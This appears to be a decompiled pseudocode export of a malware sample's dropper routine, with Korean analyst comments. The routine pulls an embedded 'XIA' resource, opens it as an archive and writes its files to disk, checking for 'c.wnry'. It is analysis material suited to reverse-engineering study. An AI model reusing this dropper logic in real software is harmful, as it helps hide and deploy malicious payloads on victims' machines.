// --- Metadata ---
// Function Name: dropper_401DAB
// Address: 0x401DAB
// Exported At: 20250519_143822
// Signature: unknown_signature
// ---------------
int __cdecl dropper_401DAB(HMODULE hModule, char *Str)
{
  HRSRC v2; // eax
  HRSRC v3; // esi
  HGLOBAL v4; // eax
  void *v5; // edi
  int v6; // eax
  _DWORD *struct_dropperReturnValue; // esi
  int v9; // ebx
  char *i; // edi
  int Src; // [esp+8h] [ebp-12Ch] BYREF
  char Str1[296]; // [esp+Ch] [ebp-128h] BYREF

  v2 = FindResourceA(hModule, 0x80A, "XIA");    // 파일에 내장된 "XIA" 타입의 0x80A ID를 가진 리소스를 찾고 메모리에 로드
  v3 = v2;
  if ( !v2 )
    return 0;
  v4 = LoadResource(hModule, v2);
  if ( !v4 )
    return 0;
  v5 = LockResource(v4);
  if ( !v5 )
    return 0;
  v6 = SizeofResource(hModule, v3);
  struct_dropperReturnValue = struct_dropper_4075AD(v5, v6, Str);// 구조체 
  if ( !struct_dropperReturnValue )
    return 0;
  Src = 0;
  memset(Str1, 0, sizeof(Str1));
  loadResourceEntry_4075C4(struct_dropperReturnValue, -1, &Src);// 전체 항목 수 가져오기 
  v9 = Src;
  for ( i = 0; i < v9; ++i )
  {
    loadResourceEntry_4075C4(struct_dropperReturnValue, i, &Src);
    if ( strcmp(Str1, "c.wnry") || GetFileAttributesA(Str1) == -1 )// "c.wnry" 파일이 존재하지 않으면 파일을 디스크로 드롭
      zipExtract_40763D(struct_dropperReturnValue, i, Str1);
  }
  ZipArchive_Close_407656(struct_dropperReturnValue);
  return 1;
}
